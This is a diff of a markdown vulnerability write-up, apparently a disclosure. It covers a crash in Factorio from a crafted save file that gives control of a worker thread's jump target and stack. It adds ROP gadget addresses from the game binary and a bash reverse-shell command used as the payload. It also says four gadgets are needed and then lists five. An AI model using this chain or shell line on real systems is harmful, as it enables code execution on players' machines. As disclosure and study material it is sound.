@@ -69,9 +69,11 @@ The first step is to create a fake save file with modified size specifications,
 filled with a [non-repeating pattern](https://en.wikipedia.org/wiki/De_Bruijn_sequence).
 Once we preview this save file, factorio will crash with a segmentation fault.
 If we attach a debugger,
+
 ```
 gdb attach (ps aux | grep factorio | grep "x64/factorio" | sed -e 's/  */,/g' | cut -d ',' -f2)
 ```
+
 we can observe multiple crashes:
 ![music_mixer_thread](img/music_mixer_thread.png)
 This appears to a thread responsible for audio.
@@ -81,21 +83,40 @@ This does not appear to be immediately exploitable, so we continue our search.
 ![main_thread](img/worker_thread.png)
 The next thread is a worker thread.
 Immediately we notice multiple interesting things:
+
 1. The thread is attempting to execute a jump
-![jump](img/jump.png)
+   ![jump](img/jump.png)
 2. The jump target is read from the location pointed at by `rbx + 0x40`
 3. `RBX` is pointing into our pattern --> we control the jump target
-![rbx](img/rbx.png)
+   ![rbx](img/rbx.png)
 4. `RSP` is also pointing into our pattern --> we control the stack of this thread
-![rsp](img/rsp.png)
+   ![rsp](img/rsp.png)
 
 --> We can use this to build a ROP chain and execute arbitrary code
 
 ### Chain construction:
 
+We can not simply write shellcode into our pattern, as the heap is marked as non-executable.
+Instead, we will use a technique
+called [return oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming).
+Essentially, we will reuse a series of existing instructions in the factorio binary to construct our exploit.
 
+[Ropper](https://github.com/sashs/Ropper) reports `638593 gadgets found`.
 
+As we have plenty of space on the chain and don't want to bother ourselves with the libc,
+we will manually execute a syscall.
 
+We only need 4 gadgets:
 
+1. `0x4128c8: pop rax; ret;` --> load syscall number into `rax`
+2. `0x4121bf: pop rdi; ret;` --> load first argument into `rdi`
+3. `0x41233d: pop rsi; ret;` --> load second argument into `rsi`
+4. `0x432a96: syscall;` --> execute syscall
+5. `0x1c76e18: mov qword ptr [rax], rsi; ret;` --> modify memory (used to specify target program and arguments)
+
+We will execute a simple reverse shell:
+```bash
+sh -i >& /dev/tcp/127.0.0.1/1337 0>&1
+```
 
 ## Reporting process
